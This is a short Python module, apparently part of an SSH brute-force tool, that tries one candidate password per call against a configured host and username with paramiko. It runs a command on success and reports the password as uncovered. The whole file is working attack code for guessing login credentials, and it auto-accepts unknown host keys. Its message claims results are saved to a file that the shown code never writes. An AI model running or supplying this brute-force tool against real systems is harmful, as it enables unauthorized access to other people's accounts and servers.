##
## Bruteforce over ssh
## author Felipe Lima <felipe@felipelima.eti.br>
##

import paramiko
import constant

class Ssh:

    def __init__(self, status):
        self.__status = status

    def get_status(self):
        return self.__status

    def set_status(self, status):
        self.__status = status

    def main(self, password):
        host = constant.HOST
        port = constant.PORT
        username = constant.USERNAME
        password = str(password).strip()
        command = "ls"
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, port, username, password)
            stdin, stdout, stderr = ssh.exec_command(command)
            lines = stdout.readlines()
            print(password + ' >>> Password uncovered : results/passWD.txt')

            return True

        except:
            print(password)
            return False
